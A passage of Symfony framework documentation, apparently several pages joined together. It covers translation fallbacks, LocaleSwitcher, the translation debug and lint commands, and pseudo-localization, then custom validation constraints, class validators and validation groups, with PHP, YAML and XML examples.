                       <!-- ... -->
                   </framework:translator>
               </framework:config>
           </container>

       .. code-block:: php

           // config/packages/translation.php
           use Symfony\Config\FrameworkConfig;

            return static function (FrameworkConfig $framework): void {
                // ...
                $framework->translator()
                    ->fallbacks(['en'])
                ;
            };

.. note::

    When Symfony can't find a translation in the given locale, it will
    add the missing translation to the log file. For details,
    see :ref:`reference-framework-translator-logging`.

.. _locale-switcher:

Switch Locale Programmatically
------------------------------

Sometimes you need to change the locale of the application dynamically
just to run some code. Imagine a console command that renders Twig templates
of emails in different languages. You need to change the locale only to
render those templates.

The ``LocaleSwitcher`` class allows you to change at once the locale
of:

* All the services that are tagged with ``kernel.locale_aware``;
* ``\Locale::setDefault()``;
* If the ``RequestContext`` service is available, the ``_locale``
  parameter (so urls are generated with the new locale)::

    use Symfony\Component\Translation\LocaleSwitcher;

    class SomeService
    {
        public function __construct(
            private LocaleSwitcher $localeSwitcher,
        ) {
        }

        public function someMethod(): void
        {
            // you can get the current application locale like this:
            $currentLocale = $this->localeSwitcher->getLocale();

            // you can set the locale for the entire application like this:
            // (from now on, the application will use 'fr' (French) as the
            // locale; including the default locale used to translate Twig templates)
            $this->localeSwitcher->setLocale('fr');

            // reset the current locale of your application to the configured default locale
            // in config/packages/translation.yaml, by option 'default_locale'
            $this->localeSwitcher->reset();

            // you can also run some code with a certain locale, without
            // changing the locale for the rest of the application
            $this->localeSwitcher->runWithLocale('es', function() {

                // e.g. render here some Twig templates using 'es' (Spanish) locale

            });

            // you can optionally declare an argument in your callback to receive the
            // injected locale
            $this->localeSwitcher->runWithLocale('es', function(string $locale) {

                // here, the $locale argument will be set to 'es'

            });

            // ...
        }
    }

When using :ref:`autowiring <services-autowire>`, type-hint any controller or
service argument with the :class:`Symfony\\Component\\Translation\\LocaleSwitcher`
class to inject the locale switcher service. Otherwise, configure your services
manually and inject the ``translation.locale_switcher`` service.

.. _translation-debug:

How to Find Missing or Unused Translation Messages
--------------------------------------------------

When you work with many translation messages in different languages, it can be
hard to keep track which translations are missing and which are not used
anymore. The ``debug:translation`` command helps you to find these missing or
unused translation messages templates:

.. code-block:: twig

    {# messages can be found when using the trans filter and tag #}
    {% trans %}Symfony is great{% endtrans %}

    {{ 'Symfony is great'|trans }}

.. caution::

    The extractors can't find messages translated outside templates (like form
    labels or controllers) unless using :ref:`translatable-objects` or calling
    the ``trans()`` method on a translator. Dynamic
    translations using variables or expressions in templates are not
    detected either:

    .. code-block:: twig

        {# this translation uses a Twig variable, so it won't be detected #}
        {% set message = 'Symfony is great' %}
        {{ message|trans }}

Suppose your application's default_locale is ``fr`` and you have configured
``en`` as the fallback locale (see :ref:`translation-configuration` and
:ref:`translation-fallback` for how to configure these). And suppose
you've already setup some translations for the ``fr`` locale:

.. configuration-block::

    .. code-block:: xml

        <!-- translations/messages.fr.xlf -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
            <file source-language="en" datatype="plaintext" original="file.ext">
                <body>
                    <trans-unit id="1">
                        <source>Symfony is great</source>
                        <target>J'aime Symfony</target>
                    </trans-unit>
                </body>
            </file>
        </xliff>

    .. code-block:: yaml

        # translations/messages.fr.yaml
        Symfony is great: J'aime Symfony

    .. code-block:: php

        // translations/messages.fr.php
        return [
            'Symfony is great' => 'J\'aime Symfony',
        ];

and for the ``en`` locale:

.. configuration-block::

    .. code-block:: xml

        <!-- translations/messages.en.xlf -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
            <file source-language="en" datatype="plaintext" original="file.ext">
                <body>
                    <trans-unit id="1">
                        <source>Symfony is great</source>
                        <target>Symfony is great</target>
                    </trans-unit>
                </body>
            </file>
        </xliff>

    .. code-block:: yaml

        # translations/messages.en.yaml
        Symfony is great: Symfony is great

    .. code-block:: php

        // translations/messages.en.php
        return [
            'Symfony is great' => 'Symfony is great',
        ];

To inspect all messages in the ``fr`` locale for the application, run:

.. code-block:: terminal

    $ php bin/console debug:translation fr

    ---------  ------------------  ----------------------  -------------------------------
     State      Id                  Message Preview (fr)    Fallback Message Preview (en)
    ---------  ------------------  ----------------------  -------------------------------
     unused     Symfony is great    J'aime Symfony          Symfony is great
    ---------  ------------------  ----------------------  -------------------------------

It shows you a table with the result when translating the message in the ``fr``
locale and the result when the fallback locale ``en`` would be used. On top
of that, it will also show you when the translation is the same as the fallback
translation (this could indicate that the message was not correctly translated).
Furthermore, it indicates that the message ``Symfony is great`` is unused
because it is translated, but you haven't used it anywhere yet.

Now, if you translate the message in one of your templates, you will get this
output:

.. code-block:: terminal

    $ php bin/console debug:translation fr

    ---------  ------------------  ----------------------  -------------------------------
     State      Id                  Message Preview (fr)    Fallback Message Preview (en)
    ---------  ------------------  ----------------------  -------------------------------
                Symfony is great    J'aime Symfony          Symfony is great
    ---------  ------------------  ----------------------  -------------------------------

The state is empty which means the message is translated in the ``fr`` locale
and used in one or more templates.

If you delete the message ``Symfony is great`` from your translation file
for the ``fr`` locale and run the command, you will get:

.. code-block:: terminal

    $ php bin/console debug:translation fr

    ---------  ------------------  ----------------------  -------------------------------
     State      Id                  Message Preview (fr)    Fallback Message Preview (en)
    ---------  ------------------  ----------------------  -------------------------------
     missing    Symfony is great    Symfony is great        Symfony is great
    ---------  ------------------  ----------------------  -------------------------------

The state indicates the message is missing because it is not translated in
the ``fr`` locale but it is still used in the template. Moreover, the message
in the ``fr`` locale equals to the message in the ``en`` locale. This is a
special case because the untranslated message id equals its translation in
the ``en`` locale.

If you copy the content of the translation file in the ``en`` locale to the
translation file in the ``fr`` locale and run the command, you will get:

.. code-block:: terminal

    $ php bin/console debug:translation fr

    ----------  ------------------  ----------------------  -------------------------------
     State       Id                  Message Preview (fr)    Fallback Message Preview (en)
    ----------  ------------------  ----------------------  -------------------------------
     fallback    Symfony is great    Symfony is great        Symfony is great
    ----------  ------------------  ----------------------  -------------------------------

You can see that the translations of the message are identical in the ``fr``
and ``en`` locales which means this message was probably copied from English
to French and maybe you forgot to translate it.

By default, all domains are inspected, but it is possible to specify a single
domain:

.. code-block:: terminal

    $ php bin/console debug:translation en --domain=messages

When the application has a lot of messages, it is useful to display only the
unused or only the missing messages, by using the ``--only-unused`` or
``--only-missing`` options:

.. code-block:: terminal

    $ php bin/console debug:translation en --only-unused
    $ php bin/console debug:translation en --only-missing

Debug Command Exit Codes
~~~~~~~~~~~~~~~~~~~~~~~~

The exit code of the ``debug:translation`` command changes depending on the
status of the translations. Use the following public constants to check it::

    use Symfony\Bundle\FrameworkBundle\Command\TranslationDebugCommand;

    // generic failure (e.g. there are no translations)
    TranslationDebugCommand::EXIT_CODE_GENERAL_ERROR;

    // there are missing translations
    TranslationDebugCommand::EXIT_CODE_MISSING;

    // there are unused translations
    TranslationDebugCommand::EXIT_CODE_UNUSED;

    // some translations are using the fallback translation
    TranslationDebugCommand::EXIT_CODE_FALLBACK;

These constants are defined as "bit masks", so you can combine them as follows::

    if (TranslationDebugCommand::EXIT_CODE_MISSING | TranslationDebugCommand::EXIT_CODE_UNUSED) {
        // ... there are missing and/or unused translations
    }

.. _translation-lint:

How to Find Errors in Translation Files
---------------------------------------

Symfony processes all the application translation files as part of the process
that compiles the application code before executing it. If there's an error in
any translation file, you'll see an error message explaining the problem.

If you prefer, you can also validate the contents of any YAML and XLIFF
translation file using the ``lint:yaml`` and ``lint:xliff`` commands:

.. code-block:: terminal

    # lint a single file
    $ php bin/console lint:yaml translations/messages.en.yaml
    $ php bin/console lint:xliff translations/messages.en.xlf

    # lint a whole directory
    $ php bin/console lint:yaml translations
    $ php bin/console lint:xliff translations

    # lint multiple files or directories
    $ php bin/console lint:yaml translations path/to/trans
    $ php bin/console lint:xliff translations/messages.en.xlf translations/messages.es.xlf

The linter results can be exported to JSON using the ``--format`` option:

.. code-block:: terminal

    $ php bin/console lint:yaml translations/ --format=json
    $ php bin/console lint:xliff translations/ --format=json

When running these linters inside `GitHub Actions`_, the output is automatically
adapted to the format required by GitHub, but you can force that format too:

.. code-block:: terminal

    $ php bin/console lint:yaml translations/ --format=github
    $ php bin/console lint:xliff translations/ --format=github

.. tip::

    The Yaml component provides a stand-alone ``yaml-lint`` binary allowing
    you to lint YAML files without having to create a console application:

    .. code-block:: terminal

        $ php vendor/bin/yaml-lint translations/

Pseudo-localization translator
------------------------------

.. note::

    The pseudolocalization translator is meant to be used for development only.

The following image shows a typical menu on a webpage:

.. image:: /_images/translation/pseudolocalization-interface-original.png
    :alt: A menu showing multiple items nicely aligned next to eachother.

This other image shows the same menu when the user switches the language to
Spanish. Unexpectedly, some text is cut and other contents are so long that
they overflow and you can't see them:

.. image:: /_images/translation/pseudolocalization-interface-translated.png
    :alt: In Spanish, some menu items contain more letters which result in them being cut.

These kind of errors are very common, because different languages can be longer
or shorter than the original application language. Another common issue is to
only check if the application works when using basic accented letters, instead
of checking for more complex characters such as the ones found in Polish,
Czech, etc.

These problems can be solved with `pseudolocalization`_, a software testing method
used for testing internationalization. In this method, instead of translating
the text of the software into a foreign language, the textual elements of an
application are replaced with an altered version of the original language.

For example, ``Account Settings`` is *translated* as ``[!!! Àççôûñţ
Šéţţîñĝš !!!]``. First, the original text is expanded in length with characters
like ``[!!! !!!]`` to test the application when using languages more verbose
than the original one. This solves the first problem.

In addition, the original characters are replaced by similar but accented
characters. This makes the text highly readable, while allowing to test the
application with all kinds of accented and special characters. This solves the
second problem.

Full support for pseudolocalization was added to help you debug
internationalization issues in your applications. You can enable and configure
it in the translator configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/translation.yaml
        framework:
            translator:
                pseudo_localization:
                    # replace characters by their accented version
                    accents: true
                    # wrap strings with brackets
                    brackets: true
                    # controls how many extra characters are added to make text longer
                    expansion_factor: 1.4
                    # maintain the original HTML tags of the translated contents
                    parse_html: true
                    # also translate the contents of these HTML attributes
                    localizable_html_attributes: ['title']

    .. code-block:: xml

        <!-- config/packages/translation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:translator>
                    <!-- accents: replace characters by their accented version -->
                    <!-- brackets: wrap strings with brackets -->
                    <!-- expansion_factor: controls how many extra characters are added to make text longer -->
                    <!-- parse_html: maintain the original HTML tags of the translated contents -->
                    <framework:pseudo-localization
                        accents="true"
                        brackets="true"
                        expansion_factor="1.4"
                        parse_html="true"
                    >
                        <!-- also translate the contents of these HTML attributes -->
                        <framework:localizable-html-attribute>title</framework:localizable-html-attribute>
                    </framework:pseudo-localization>
                </framework:translator>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/translation.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework) {
            // ...
            $framework
                ->translator()
                    ->pseudoLocalization()
                        // replace characters by their accented version
                        ->accents(true)
                        // wrap strings with brackets
                        ->brackets(true)
                        // controls how many extra characters are added to make text longer
                        ->expansionFactor(1.4)
                        // maintain the original HTML tags of the translated contents
                        ->parseHtml(true)
                        // also translate the contents of these HTML attributes
                        ->localizableHtmlAttributes(['title'])
            ;
        };

That's all. The application will now start displaying those strange, but
readable, contents to help you internationalize it. See for example the
difference in the `Symfony Demo`_ application. This is the original page:

.. image:: /_images/translation/pseudolocalization-symfony-demo-disabled.png
    :alt: The Symfony demo login page.
    :class: with-browser

And this is the same page with pseudolocalization enabled:

.. image:: /_images/translation/pseudolocalization-symfony-demo-enabled.png
    :alt: The Symfony demo login page with pseudolocalization.
    :class: with-browser

Summary
-------

With the Symfony Translation component, creating an internationalized application
no longer needs to be a painful process and boils down to these steps:

* Abstract messages in your application by wrapping each in the
  :method:`Symfony\\Component\\Translation\\Translator::trans` method;

* Translate each message into multiple locales by creating translation message
  files. Symfony discovers and processes each file because its name follows
  a specific convention;

* Manage the user's locale, which is stored on the request, but can also
  be set on the user's session.

Learn more
----------

.. toctree::
    :maxdepth: 1

    reference/formats/message_format
    reference/formats/xliff

.. _`i18n`: https://en.wikipedia.org/wiki/Internationalization_and_localization
.. _`ICU MessageFormat`: https://unicode-org.github.io/icu/userguide/format_parse/messages/
.. _`ISO 3166-1 alpha-2`: https://en.wikipedia.org/wiki/ISO_3166-1#Current_codes
.. _`ISO 639-1`: https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes
.. _`Translatable Extension`: https://github.com/doctrine-extensions/DoctrineExtensions/blob/main/doc/translatable.md
.. _`Translatable Behavior`: https://github.com/KnpLabs/DoctrineBehaviors
.. _`Custom Language Name setting`: https://docs.lokalise.com/en/articles/1400492-uploading-files#custom-language-codes
.. _`ICU resource bundle`: https://github.com/unicode-org/icu-docs/blob/main/design/bnf_rb.txt
.. _`Portable object format`: https://www.gnu.org/software/gettext/manual/html_node/PO-Files.html
.. _`Machine object format`: https://www.gnu.org/software/gettext/manual/html_node/MO-Files.html
.. _`QT Translations TS XML`: https://doc.qt.io/qt-5/linguist-ts-file-format.html
.. _`GitHub Actions`: https://docs.github.com/en/free-pro-team@latest/actions
.. _`pseudolocalization`: https://en.wikipedia.org/wiki/Pseudolocalization
.. _`Symfony Demo`: https://github.com/symfony/demo
.. _`Crowdin Language Codes`: https://developer.crowdin.com/language-codes
.. _`Custom Language Codes`: https://support.crowdin.com/project-settings/#languages
.. _`Identification via User-Agent`: https://developers.phrase.com/api/#overview--identification-via-user-agent
.. _`Phrase Tag Bundle`: https://github.com/wickedOne/phrase-tag-bundle
How to Create a Custom Validation Constraint
============================================

You can create a custom constraint by extending the base constraint class,
:class:`Symfony\\Component\\Validator\\Constraint`. As an example you're
going to create a basic validator that checks if a string contains only
alphanumeric characters.

Creating the Constraint Class
-----------------------------

First you need to create a Constraint class and extend :class:`Symfony\\Component\\Validator\\Constraint`:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Validator/ContainsAlphanumeric.php
        namespace App\Validator;

        use Symfony\Component\Validator\Constraint;

        #[\Attribute]
        class ContainsAlphanumeric extends Constraint
        {
            public string $message = 'The string "{{ string }}" contains an illegal character: it can only contain letters or numbers.';
            public string $mode = 'strict';

            // all configurable options must be passed to the constructor
            public function __construct(?string $mode = null, ?string $message = null, ?array $groups = null, $payload = null)
            {
                parent::__construct([], $groups, $payload);

                $this->mode = $mode ?? $this->mode;
                $this->message = $message ?? $this->message;
            }
        }

Add ``#[\Attribute]`` to the constraint class if you want to
use it as an attribute in other classes.

You can use ``#[HasNamedArguments]`` to make some constraint options required::

    // src/Validator/ContainsAlphanumeric.php
    namespace App\Validator;

    use Symfony\Component\Validator\Attribute\HasNamedArguments;
    use Symfony\Component\Validator\Constraint;

    #[\Attribute]
    class ContainsAlphanumeric extends Constraint
    {
        public string $message = 'The string "{{ string }}" contains an illegal character: it can only contain letters or numbers.';

        #[HasNamedArguments]
        public function __construct(
            public string $mode,
            ?array $groups = null,
            mixed $payload = null,
        ) {
            parent::__construct([], $groups, $payload);
        }
    }

Creating the Validator itself
-----------------------------

As you can see, a constraint class is fairly minimal. The actual validation is
performed by another "constraint validator" class. The constraint validator
class is specified by the constraint's ``validatedBy()`` method, which
has this default logic::

    // in the base Symfony\Component\Validator\Constraint class
    public function validatedBy(): string
    {
        return static::class.'Validator';
    }

In other words, if you create a custom ``Constraint`` (e.g. ``MyConstraint``),
Symfony will automatically look for another class, ``MyConstraintValidator``
when actually performing the validation.

The validator class only has one required method ``validate()``::

    // src/Validator/ContainsAlphanumericValidator.php
    namespace App\Validator;

    use Symfony\Component\Validator\Constraint;
    use Symfony\Component\Validator\ConstraintValidator;
    use Symfony\Component\Validator\Exception\UnexpectedTypeException;
    use Symfony\Component\Validator\Exception\UnexpectedValueException;

    class ContainsAlphanumericValidator extends ConstraintValidator
    {
        public function validate(mixed $value, Constraint $constraint): void
        {
            if (!$constraint instanceof ContainsAlphanumeric) {
                throw new UnexpectedTypeException($constraint, ContainsAlphanumeric::class);
            }

            // custom constraints should ignore null and empty values to allow
            // other constraints (NotBlank, NotNull, etc.) to take care of that
            if (null === $value || '' === $value) {
                return;
            }

            if (!is_string($value)) {
                // throw this exception if your validator cannot handle the passed type so that it can be marked as invalid
                throw new UnexpectedValueException($value, 'string');

                // separate multiple types using pipes
                // throw new UnexpectedValueException($value, 'string|int');
            }

            // access your configuration options like this:
            if ('strict' === $constraint->mode) {
                // ...
            }

            if (preg_match('/^[a-zA-Z0-9]+$/', $value, $matches)) {
                return;
            }

            // the argument must be a string or an object implementing __toString()
            $this->context->buildViolation($constraint->message)
                ->setParameter('{{ string }}', $value)
                ->addViolation();
        }
    }

Inside ``validate()``, you don't need to return a value. Instead, you add violations
to the validator's ``context`` property and a value will be considered valid
if it causes no violations. The ``buildViolation()`` method takes the error
message as its argument and returns an instance of
:class:`Symfony\\Component\\Validator\\Violation\\ConstraintViolationBuilderInterface`.
The ``addViolation()`` method call finally adds the violation to the context.

Using the new Validator
-----------------------

You can use custom validators like the ones provided by Symfony itself:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/AcmeEntity.php
        namespace App\Entity;

        use App\Validator as AcmeAssert;
        use Symfony\Component\Validator\Constraints as Assert;

        class AcmeEntity
        {
            // ...

            #[Assert\NotBlank]
            #[AcmeAssert\ContainsAlphanumeric(mode: 'loose')]
            protected string $name;

            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\User:
            properties:
                name:
                    - NotBlank: ~
                    - App\Validator\ContainsAlphanumeric:
                        mode: 'loose'

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\User">
                <property name="name">
                    <constraint name="NotBlank"/>
                    <constraint name="App\Validator\ContainsAlphanumeric">
                        <option name="mode">loose</option>
                    </constraint>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/User.php
        namespace App\Entity;

        use App\Validator\ContainsAlphanumeric;
        use Symfony\Component\Validator\Constraints\NotBlank;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class User
        {
            protected string $name = '';

            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('name', new NotBlank());
                $metadata->addPropertyConstraint('name', new ContainsAlphanumeric(['mode' => 'loose']));
            }
        }

If your constraint contains options, then they should be public properties
on the custom Constraint class you created earlier. These options can be
configured like options on core Symfony constraints.

Constraint Validators with Dependencies
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
then your validator is already registered as a service and :doc:`tagged </service_container/tags>`
with the necessary ``validator.constraint_validator``. This means you can
:ref:`inject services or configuration <services-constructor-injection>` like any other service.

Constraint Validators with Custom Options
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you want to add some configuration options to your custom constraint, first
define those options as public properties on the constraint class::

    // src/Validator/Foo.php
    namespace App\Validator;

    use Symfony\Component\Validator\Constraint;

    #[\Attribute]
    class Foo extends Constraint
    {
        public $mandatoryFooOption;
        public $message = 'This value is invalid';
        public $optionalBarOption = false;

        public function __construct(
            $mandatoryFooOption,
            ?string $message = null,
            ?bool $optionalBarOption = null,
            ?array $groups = null,
            $payload = null,
            array $options = []
        ) {
            if (\is_array($mandatoryFooOption)) {
                $options = array_merge($mandatoryFooOption, $options);
            } elseif (null !== $mandatoryFooOption) {
                $options['value'] = $mandatoryFooOption;
            }

            parent::__construct($options, $groups, $payload);

            $this->message = $message ?? $this->message;
            $this->optionalBarOption = $optionalBarOption ?? $this->optionalBarOption;
        }

        public function getDefaultOption(): string
        {
            return 'mandatoryFooOption';
        }

        public function getRequiredOptions(): array
        {
            return ['mandatoryFooOption'];
        }
    }

Then, inside the validator class you can access these options directly via the
constraint class passes to the ``validate()`` method::

    class FooValidator extends ConstraintValidator
    {
        public function validate($value, Constraint $constraint)
        {
            // access any option of the constraint
            if ($constraint->optionalBarOption) {
                // ...
            }

            // ...
        }
    }

When using this constraint in your own application, you can pass the value of
the custom options like you pass any other option in built-in constraints:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/AcmeEntity.php
        namespace App\Entity;

        use App\Validator as AcmeAssert;
        use Symfony\Component\Validator\Constraints as Assert;

        class AcmeEntity
        {
            // ...

            #[Assert\NotBlank]
            #[AcmeAssert\Foo(
                mandatoryFooOption: 'bar',
                optionalBarOption: true
            )]
            protected $name;

            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\AcmeEntity:
            properties:
                name:
                    - NotBlank: ~
                    - App\Validator\Foo:
                        mandatoryFooOption: bar
                        optionalBarOption: true

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\AcmeEntity">
                <property name="name">
                    <constraint name="NotBlank"/>
                    <constraint name="App\Validator\Foo">
                        <option name="mandatoryFooOption">bar</option>
                        <option name="optionalBarOption">true</option>
                    </constraint>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/AcmeEntity.php
        namespace App\Entity;

        use App\Validator\ContainsAlphanumeric;
        use Symfony\Component\Validator\Constraints\NotBlank;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class AcmeEntity
        {
            public $name;

            public static function loadValidatorMetadata(ClassMetadata $metadata)
            {
                $metadata->addPropertyConstraint('name', new NotBlank());
                $metadata->addPropertyConstraint('name', new Foo([
                    'mandatoryFooOption' => 'bar',
                    'optionalBarOption' => true,
                ]));
            }
        }

Create a Reusable Set of Constraints
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In case you need to consistently apply a common set of constraints
across your application, you can extend the :doc:`Compound constraint </reference/constraints/Compound>`.

Class Constraint Validator
~~~~~~~~~~~~~~~~~~~~~~~~~~

Besides validating a single property, a constraint can have an entire class
as its scope.

For instance, imagine you also have a ``PaymentReceipt`` entity and you
need to make sure the email of the receipt payload matches the user's
email. First, create a constraint and override the ``getTargets()`` method::

    // src/Validator/ConfirmedPaymentReceipt.php
    namespace App\Validator;

    use Symfony\Component\Validator\Constraint;

    #[\Attribute]
    class ConfirmedPaymentReceipt extends Constraint
    {
        public string $userDoesNotMatchMessage = 'User\'s e-mail address does not match that of the receipt';

        public function getTargets(): string
        {
            return self::CLASS_CONSTRAINT;
        }
    }

Now, the constraint validator will get an object as the first argument to
``validate()``::

    // src/Validator/ConfirmedPaymentReceiptValidator.php
    namespace App\Validator;

    use Symfony\Component\Validator\Constraint;
    use Symfony\Component\Validator\ConstraintValidator;
    use Symfony\Component\Validator\Exception\UnexpectedValueException;

    class ConfirmedPaymentReceiptValidator extends ConstraintValidator
    {
        /**
         * @param PaymentReceipt $receipt
         */
        public function validate($receipt, Constraint $constraint): void
        {
            if (!$receipt instanceof PaymentReceipt) {
                throw new UnexpectedValueException($receipt, PaymentReceipt::class);
            }

            if (!$constraint instanceof ConfirmedPaymentReceipt) {
                throw new UnexpectedValueException($constraint, ConfirmedPaymentReceipt::class);
            }

            $receiptEmail = $receipt->getPayload()['email'] ?? null;
            $userEmail = $receipt->getUser()->getEmail();

            if ($userEmail !== $receiptEmail) {
                $this->context
                    ->buildViolation($constraint->userDoesNotMatchMessage)
                    ->atPath('user.email')
                    ->addViolation();
            }
        }
    }

.. tip::

    The ``atPath()`` method defines the property with which the validation error is
    associated. Use any :doc:`valid PropertyAccess syntax </components/property_access>`
    to define that property.

A class constraint validator must be applied to the class itself:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/AcmeEntity.php
        namespace App\Entity;

        use App\Validator as AcmeAssert;

        #[AcmeAssert\ProtocolClass]
        class AcmeEntity
        {
            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\PaymentReceipt:
            constraints:
                - App\Validator\ConfirmedPaymentReceipt: ~

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\PaymentReceipt">
                <constraint name="App\Validator\ConfirmedPaymentReceipt"/>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/PaymentReceipt.php
        namespace App\Entity;

        use App\Validator\ConfirmedPaymentReceipt;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class PaymentReceipt
        {
            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addConstraint(new ConfirmedPaymentReceipt());
            }
        }

Testing Custom Constraints
--------------------------

Use the :class:`Symfony\\Component\\Validator\\Test\\ConstraintValidatorTestCase`
class to simplify writing unit tests for your custom constraints::

    // tests/Validator/ContainsAlphanumericValidatorTest.php
    namespace App\Tests\Validator;

    use App\Validator\ContainsAlphanumeric;
    use App\Validator\ContainsAlphanumericValidator;
    use Symfony\Component\Validator\ConstraintValidatorInterface;
    use Symfony\Component\Validator\Test\ConstraintValidatorTestCase;

    class ContainsAlphanumericValidatorTest extends ConstraintValidatorTestCase
    {
        protected function createValidator(): ConstraintValidatorInterface
        {
            return new ContainsAlphanumericValidator();
        }

        public function testNullIsValid(): void
        {
            $this->validator->validate(null, new ContainsAlphanumeric());

            $this->assertNoViolation();
        }

        /**
         * @dataProvider provideInvalidConstraints
         */
        public function testTrueIsInvalid(ContainsAlphanumeric $constraint): void
        {
            $this->validator->validate('...', $constraint);

            $this->buildViolation('myMessage')
                ->setParameter('{{ string }}', '...')
                ->assertRaised();
        }

        public function provideInvalidConstraints(): \Generator
        {
            yield [new ContainsAlphanumeric(message: 'myMessage')];
            // ...
        }
    }
How to Apply only a Subset of all Your Validation Constraints (Validation Groups)
=================================================================================

By default, when validating an object all constraints of this class will
be checked whether or not they actually pass. In some cases, however, you
will need to validate an object against only *some* constraints on that class.
To do this, you can organize each constraint into one or more "validation
groups" and then apply validation against one group of constraints.

For example, suppose you have a ``User`` class, which is used both when a
user registers and when a user updates their contact information later:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Security\Core\User\UserInterface;
        use Symfony\Component\Validator\Constraints as Assert;

        class User implements UserInterface
        {
            #[Assert\Email(groups: ['registration'])]
            private string $email;

            #[Assert\NotBlank(groups: ['registration'])]
            #[Assert\Length(min: 7, groups: ['registration'])]
            private string $password;

            #[Assert\Length(min: 2)]
            private string $city;
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\User:
            properties:
                email:
                    - Email: { groups: [registration] }
                password:
                    - NotBlank: { groups: [registration] }
                    - Length: { min: 7, groups: [registration] }
                city:
                    - Length:
                        min: 2

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="
                http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd
            ">

            <class name="App\Entity\User">
                <property name="email">
                    <constraint name="Email">
                        <option name="groups">
                            <value>registration</value>
                        </option>
                    </constraint>
                </property>

                <property name="password">
                    <constraint name="NotBlank">
                        <option name="groups">
                            <value>registration</value>
                        </option>
                    </constraint>
                    <constraint name="Length">
                        <option name="min">7</option>
                        <option name="groups">
                            <value>registration</value>
                        </option>
                    </constraint>
                </property>

                <property name="city">
                    <constraint name="Length">
                        <option name="min">2</option>
                    </constraint>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class User
        {
            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('email', new Assert\Email([
                    'groups' => ['registration'],
                ]));

                $metadata->addPropertyConstraint('password', new Assert\NotBlank([
                    'groups' => ['registration'],
                ]));
                $metadata->addPropertyConstraint('password', new Assert\Length([
                    'min'    => 7,
                    'groups' => ['registration'],
                ]));

                $metadata->addPropertyConstraint('city', new Assert\Length([
                    'min' => 2,
                ]));
            }
        }

With this configuration, there are three validation groups:

``Default``
    Contains the constraints in the current class and all referenced classes
    that belong to no other group. In this example, it only contains the
    ``city`` field.

``User``
    Equivalent to all constraints of the ``User`` object in the ``Default``
    group. This is always the name of the class. The difference between this
    and ``Default`` is explained in :doc:`/validation/sequence_provider`.

``registration``
    This is a custom validation group, so it only contains the constraints
    that are explicitly associated with it. In this example, only the ``email`` and
    ``password`` fields.

